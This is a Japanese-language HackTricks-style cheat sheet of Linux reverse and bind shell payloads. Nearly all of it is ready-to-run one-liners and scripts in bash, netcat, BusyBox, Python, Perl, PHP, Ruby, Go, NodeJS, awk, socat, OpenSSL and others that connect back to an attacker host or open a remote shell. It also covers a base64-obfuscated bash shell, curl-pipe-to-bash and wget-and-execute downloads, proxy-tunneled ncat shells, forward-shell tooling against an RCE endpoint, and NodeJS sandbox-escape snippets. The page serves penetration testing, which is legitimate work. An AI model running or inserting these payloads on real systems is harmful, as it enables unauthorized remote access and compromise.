# Shells - Linux

{{#include ../../banners/hacktricks-training.md}}

**これらの shell について質問がある場合は、** [**https://explainshell.com/**](https://explainshell.com/)**で確認できます。**<sup>[[9]](#references)</sup>

## Full TTY

**reverse shell を取得したら、**[ **このページを読んで full TTY を取得してください**](full-ttys.md)**。**

以下にまとめた基本的な reverse-shell payloads は、HighOn.Coffee と PayloadsAllTheThings のチートシートにも記載されています。どれを選ぶか決める前に、対象でインタープリターとユーティリティが利用可能か確認してください。<sup>[[1]](#references)[[4]](#references)</sup>

## Bash | sh

```bash
curl https://reverse-shell.sh/1.1.1.1:3000 | bash
bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1
bash -i >& /dev/udp/127.0.0.1/4242 0>&1 #UDP
0<&196;exec 196<>/dev/tcp/<ATTACKER-IP>/<PORT>; sh <&196 >&196 2>&196
exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; done

#Short and bypass (credits to Dikline)
(sh)0>/dev/tcp/10.10.10.10/9091
#after getting the previous shell to get the output to execute
exec >&0
```

他の shell（sh、ash、bsh、csh、ksh、zsh、pdksh、tcsh、bash）でも確認してください。

### 記号に安全なシェル

```bash
#If you need a more stable connection do:
bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'

#Stealthier method
#B64 encode the shell like: echo "bash -c 'bash -i >& /dev/tcp/10.8.4.185/4444 0>&1'" | base64 -w0
echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMScK | base64 -d | bash 2>/dev/null
```

#### Shellの説明

以下の項目は、Bashで文書化されている対話動作とリダイレクト動作をまとめたものです:<sup>[[10]](#references)[[11]](#references)</sup>

1. **`bash -i`**: コマンドのこの部分は、対話型（`-i`）のBashシェルを起動します。
2. **`>&`**: コマンドのこの部分は、**標準出力**（`stdout`）と**標準エラー**（`stderr`）の両方を**同じ宛先にリダイレクト**するための短縮表記です。
3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: 指定したIPアドレスとポートへのTCP接続を**表す特殊ファイル**です。
   - **出力ストリームとエラーストリームをこのファイルにリダイレクトする**ことで、対話型シェルセッションの出力が攻撃者のマシンに送信されます。
4. **`0>&1`**: コマンドのこの部分は、標準入力（`stdin`）を標準出力（`stdout`）と同じ宛先に**リダイレクト**します。

### ファイルに作成して実行する

```bash
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER-IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
```

## Forward Shell

RCEが利用可能でも、reverse shellがfirewall、NAT、またはアウトバウンドフィルタリングによってブロックされる場合、RCEチャネル経由のforward shellを使うことで、セミインタラクティブなセッションを確立できます。<sup>[[12]](#references)</sup>

この用途に推奨されるツールは[toboggan](https://github.com/n3rada/toboggan.git)です。これはコマンド実行プリミティブをインタラクティブなセッションで利用できるようにします。<sup>[[12]](#references)</sup>

tobogganを使うには、対象システムのRCEコンテキストに合わせたPythonモジュールを作成します。モジュールのインターフェースでは、コマンド出力を返す`execute(command, timeout)`関数が必要です。<sup>[[12]](#references)</sup> たとえば、`nix.py`という名前のモジュールは、次のように構成できます。

```python3
import jwt
import httpx

def execute(command: str, timeout: float = None) -> str:
    # Generate JWT Token embedding the command, using space-to-${IFS} substitution for command execution
    token = jwt.encode(
        {"cmd": command.replace(" ", "${IFS}")}, "!rLsQaHs#*&L7%F24zEUnWZ8AeMu7^", algorithm="HS256"
    )

    response = httpx.get(
        url="https://vulnerable.io:3200",
        headers={"Authorization": f"Bearer {token}"},
        timeout=timeout,
        # ||BURP||
        verify=False,
    )

    # Check if the request was successful
    response.raise_for_status()

    return response.text
```

tobogganの現在のコマンドライン形式でモジュールを実行します:<sup>[[12]](#references)</sup>

```shell
toboggan nix.py
```

これでインタラクティブセッションが開始します。組み込みのBurp Suiteバックエンドを使う場合は `toboggan --request burp_request.xml` を、コマンドラッパーバックエンドを使う場合は `toboggan --exec-wrapper '<command_template>'` を使用してください。<sup>[[12]](#references)</sup>

もう1つの方法として、`IppSec` のforward-shell実装があります [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell)。<sup>[[13]](#references)</sup>

以下の部分を変更する必要があります。<sup>[[13]](#references)</sup>

- 脆弱なホストのURL
- ペイロードのprefixとsuffix（ある場合）
- ペイロードの送信方法（headers? data? 追加情報?）

その後、**コマンドを送信**するか、**`upgrade` コマンド**を使って完全なPTYを取得できます。この実装は約1.3秒間隔で出力をポーリングします。<sup>[[13]](#references)</sup>

## Netcat

```bash
nc -e /bin/sh <ATTACKER-IP> <PORT>
nc <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER-IP> <PORT> >/tmp/f
nc <ATTACKER-IP> <PORT1>| /bin/bash | nc <ATTACKER-IP> <PORT2>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```

## BusyBox

BusyBox は多くのユーティリティを1つの小さな実行ファイルにまとめたもので、小規模な Linux システムや組み込み Linux システムでよく使われています。単体の `nc` がない場合は、BusyBox で利用できるか確認してください:<sup>[[8]](#references)[[19]](#references)</sup>

```bash
busybox --list-full | grep -E '(^|/)nc$'
busybox nc <ATTACKER-IP> <PORT> -e /bin/sh
busybox nc <ATTACKER-IP> <PORT> -e sh
```

`busybox nc` が存在するものの、対話的な実行が不安定な場合は、`nc` セクションの FIFO パターンをそのアプレット向けに調整してください:<sup>[[2]](#references)[[8]](#references)</sup>

```bash
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|busybox nc <ATTACKER-IP> <PORT> >/tmp/f
```

## gsocket

公式のデプロイ手順は[https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/)を確認してください。<sup>[[14]](#references)</sup>

```bash
bash -c "$(curl -fsSL gsocket.io/x)"
```

## Telnet

```bash
telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
telnet <ATTACKER-IP> <PORT> | /bin/bash | telnet <ATTACKER-IP> <PORT>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```

## Whois

**攻撃者**

```bash
while true; do nc -l <port>; done
```

Whoisセクションで説明したものと同じEnter/CTRL+D入力シーケンスを使用します。<sup>[[3]](#references)</sup>

**被害者**

```bash
export X=Connected; while true; do X=`eval $(whois -h <IP> -p <Port> "Output: $X")`; sleep 1; done
```

## Python

```bash
#Linux
export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
#IPv6
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
```

## Perl

```bash
perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

## Ruby

```bash
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

## PHP

```php
// Using 'exec' is the most common method, but assumes that the file descriptor will be 3.
// Using this method may lead to instances where the connection reaches out to the listener and then closes.
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

// Using 'proc_open' makes no assumptions about what the file descriptor will be.
// See https://security.stackexchange.com/a/198944 for more information
<?php $sock=fsockopen("10.0.0.1",1234);$proc=proc_open("/bin/sh -i",array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>

<?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.14.8/4444 0>&1'"); ?>
```

## Java

```bash
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

## Ncat

```bash
victim> ncat <ip> <port,eg.443> --ssl  -c  "bash -i 2>&1"
attacker> ncat -l <port,eg.443> --ssl
```

### 明示的な outbound proxy 経由

ターゲットから HTTP `CONNECT` または SOCKS proxy には接続できるものの、listener への直接 TCP 接続を確立できない場合は、connect mode で **Ncat** を使用します。proxy は listener のホストとポートへのトンネルを許可している必要があります。`CONNECT` はセットアップ後にバイト列を転送するだけなので、通常の shell は **HTTP トラフィックではなく**、HTTP proxy を使用しているからといって暗号化されるわけでもありません。<sup>[[20]](#references)[[21]](#references)[[22]](#references)</sup>

```bash
# Attacker: expose a listener reachable from the proxy
ncat -l 443

# Target: HTTP CONNECT proxy (default proxy type)
ncat --proxy <PROXY_HOST>:<PROXY_PORT> --proxy-type http --exec "/bin/sh -i" <ATTACKER_HOST> 443

# Target: use this instead for a SOCKS5 proxy
ncat --proxy <PROXY_HOST>:<PROXY_PORT> --proxy-type socks5 --exec "/bin/sh -i" <ATTACKER_HOST> 443
```

認証付きプロキシの場合、Ncatでは`--proxy-auth`または`NCAT_PROXY_AUTH`を指定できます（後者を使うと、コマンド引数に認証情報を含めずに済みます）。<sup>[[23]](#references)</sup> デフォルトでは、宛先ホスト名はプロキシが解決します。ローカルでの名前解決が必要な場合に限り、`--proxy-dns local`を使用してください。<sup>[[23]](#references)</sup> プロキシが`CONNECT`以外のTLSやアプリケーションプロトコルを要求する場合は、ポート443なら生のシェルを隠せると決めつけず、適切な暗号化トランスポートを使用してください。WebSocketベースのトランスポートについては、[トンネリングとポートフォワーディング](../tunneling-and-port-forwarding.md)を参照してください。<sup>[[22]](#references)[[24]](#references)</sup>

## Golang

```bash
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```

## Lua

```bash
#Linux
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
#Windows & Linux
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```

## NodeJS

```javascript
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(8080, "10.17.26.64", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();


or

require('child_process').exec('nc -e /bin/sh [IPADDR] [PORT]')
require('child_process').exec("bash -c 'bash -i >& /dev/tcp/10.10.14.2/6767 0>&1'")

or

-var x = global.process.mainModule.require
-x('child_process').exec('nc [IPADDR] [PORT] -e /bin/bash')

or

// If you get to the constructor of a function you can define and execute another function inside a string
"".sub.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()
"".__proto__.constructor.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()


or

// Abuse this syntax to get a reverse shell
var fs = this.process.binding('fs');
var fs = process.binding('fs');

or

https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
```

## Zsh（組み込み TCP）

```bash
# Requires no external binaries; leverages zsh/net/tcp module
zsh -c 'zmodload zsh/net/tcp; ztcp <ATTACKER-IP> <PORT>; zsh -i <&$REPLY >&$REPLY 2>&$REPLY'
```

## Rustcat (rcat)

[https://github.com/robiot/rustcat](https://github.com/robiot/rustcat) – Rustで書かれたモダンなnetcat風リスナー。<sup>[[5]](#references)</sup>

```bash
# Attacker – interactive listener with history & tab-completion
rcat listen -ib 55600

# Victim – download a Linux release binary and connect back with /bin/bash
curl -L https://github.com/robiot/rustcat/releases/download/v3.0.0/rcat-v3.0.0-linux-x86_64 -o /tmp/rcat \
  && chmod +x /tmp/rcat \
  && /tmp/rcat connect -s /bin/bash <ATTACKER-IP> 55600
```

プロジェクトのドキュメントに記載されている機能:<sup>[[5]](#references)</sup>
- インタラクティブモードでのコマンド履歴とタブ補完
- `connect` で使用するシェル実行ファイルを選択する `-s`

## pwncat-cs

**raw reverse shell** がすでにあるものの、より使いやすいセッションをセットアップできるリスナーが必要な場合、`pwncat-cs` で接続を処理し、リモート PTY を試すことができます。<sup>[[7]](#references)</sup>

```bash
# Attacker - catch a plain reverse shell and auto-upgrade it when possible
python3 -m pip install --user pwncat-cs
pwncat-cs -lp 4444

# Victim - reuse any payload from this page
bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/4444 0>&1'
```

また、**暗号化された** `ssl-bind` および `ssl-connect` チャネルにも対応しているため、通信の暗号化が必要な場合は、`ncat --ssl` や `socat OPENSSL:` のペイロードと組み合わせられます。<sup>[[7]](#references)</sup>

## revsh（暗号化対応・pivot対応）

`revsh` は小型の C クライアント／サーバーで、**暗号化された Diffie-Hellman トンネル**経由で完全な TTY を提供し、オプションで **TUN/TAP** インターフェースを接続して、reverse VPN のような pivot を実現できます。<sup>[[6]](#references)</sup>

```bash
# Build after preparing the OpenSSL dependency as described in the repository README
git clone https://github.com/emptymonkey/revsh && cd revsh && make

# Attacker – controller/listener on 443
revsh -c 0.0.0.0:443

# Victim – reverse shell over the encrypted tunnel
./revsh <ATTACKER-IP>:443
```

`revsh` のドキュメントに記載されている便利なフラグ:<sup>[[6]](#references)</sup>
- `-b`: bind-shell モード（両端で有効にする）
- `-D [LHOST:]LPORT` または `-B [RHOST:]RPORT`: 動的な SOCKS 4/4a/5 forwarding
- `-x`: プロキシの自動設定を無効化（デフォルトの TUN/TAP 設定を含む）

暗号化トンネルにより shell の通信が平文で露出するのを防げますが、それだけではネットワークポリシーを回避できません。<sup>[[6]](#references)</sup>

## OpenSSL

このセクションでは、OpenSSL の `req`、`s_server`、`s_client` コマンドを使用して証明書を作成し、TLS 経由で shell を運びます。<sup>[[15]](#references)[[16]](#references)[[17]](#references)</sup>

攻撃者（Kali）

```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port>
```

被害者

```bash
#Linux - one-port TLS shell using a named pipe
mkfifo /tmp/.s; /bin/sh -i </tmp/.s 2>&1 | openssl s_client -quiet -connect <ATTACKER_IP>:<PORT> >/tmp/.s; rm /tmp/.s

#If the target needs SNI / hostname validation to blend with a fronted TLS service
mkfifo /tmp/.s; /bin/sh -i </tmp/.s 2>&1 | openssl s_client -quiet -servername <DOMAIN> -verify_return_error -verify_hostname <DOMAIN> -connect <ATTACKER_IP>:<PORT> >/tmp/.s; rm /tmp/.s
```

分離された入力/出力チャネルが必要な場合は、従来の **two-listener** パターンも引き続き使用できます。<sup>[[16]](#references)[[17]](#references)</sup>

```bash
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```

## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bind shell

```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337
```

### Reverse shell

```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```

## Awk

```bash
awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

## Finger

**攻撃者**

```bash
while true; do nc -l 79; done
```

コマンドを入力し、Enterキーを押してから、CTRL+Dを押してSTDINを停止します。<sup>[[3]](#references)</sup>

**被害者**

```bash
export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null')`; sleep 1; done

export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null | grep '!'|sed 's/^!//')`; sleep 1; done
```

## Gawk

```bash
#!/usr/bin/gawk -f

BEGIN {
        Port    =       8080
        Prompt  =       "bkd> "

        Service = "/inet/tcp/" Port "/0/0"
        while (1) {
                do {
                        printf Prompt |& Service
                        Service |& getline cmd
                        if (cmd) {
                                while ((cmd |& getline) > 0)
                                        print $0 |& Service
                                close(cmd)
                        }
                } while (cmd != "exit")
                close(Service)
        }
}
```

## Xterm

ポート 6001 であなたのシステムへの接続を試みます。<sup>[[2]](#references)</sup>

```bash
xterm -display 10.0.0.1:1
```

リバースシェルを受け取るには、以下に示すようにポート6001で待ち受けるX serverを使用します。<sup>[[2]](#references)</sup>

```bash
# Authorize host
xhost +targetip
# Listen
Xnest :1
```

## Groovy

作成者: [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76)。注: Java reverse shellもGroovyで動作します。<sup>[[18]](#references)</sup>

```bash
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

## References

- [1] [Reverse Shell チートシート: PHP、ASP、Netcat、Bash、Python](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
- [2] [Reverse Shell チートシート](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [3] [Reverse Shell における Whois と Finger の使用](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
- [4] [PayloadsAllTheThings - Reverse Shell チートシート](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [5] [rustcat - 最新のポートリスナーと reverse shell](https://github.com/robiot/rustcat)
- [6] [revsh - terminal support、data tunneling、高度な pivoting 機能を備えた reverse shell](https://github.com/emptymonkey/revsh)
- [7] [pwncat (pwncat-cs) - post-exploitation プラットフォーム](https://github.com/calebstewart/pwncat)
- [8] [busybox | GTFOBins](https://gtfobins.org/gtfobins/busybox/)
- [9] [explainshell.com](https://explainshell.com/)
- [10] [Bash リファレンスマニュアル: リダイレクト](https://www.gnu.org/s/bash/manual/html_node/Redirections.html)
- [11] [Bash リファレンスマニュアル: Bash の起動](https://www.gnu.org/software/bash/manual/html_node/Invoking-Bash.html)
- [12] [toboggan](https://github.com/n3rada/toboggan)
- [13] [forward-shell](https://github.com/IppSec/forward-shell)
- [14] [Global Socket のデプロイ手順](https://www.gsocket.io/deploy/)
- [15] [openssl-req](https://docs.openssl.org/4.0/man1/openssl-req/)
- [16] [openssl-s_server](https://docs.openssl.org/master/man1/openssl-s_server/)
- [17] [openssl-s_client](https://docs.openssl.org/master/man1/openssl-s_client/)
- [18] [純粋な Groovy/Java による Reverse Shell](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76)
- [19] [BusyBox](https://busybox.net/about.html)
- [20] [Ncat のプロキシ](https://nmap.org/ncat/guide/ncat-proxy.html)
- [21] [Ncat のコマンド実行](https://nmap.org/ncat/guide/ncat-exec.html)
- [22] [RFC 9110: CONNECT](https://www.rfc-editor.org/rfc/rfc9110.html#section-9.3.6)
- [23] [Ncat リファレンスガイド](https://nmap.org/book/ncat-man.html)
- [24] [wstunnel README](https://github.com/erebe/wstunnel/blob/main/README.md)
{{#include ../../banners/hacktricks-training.md}}
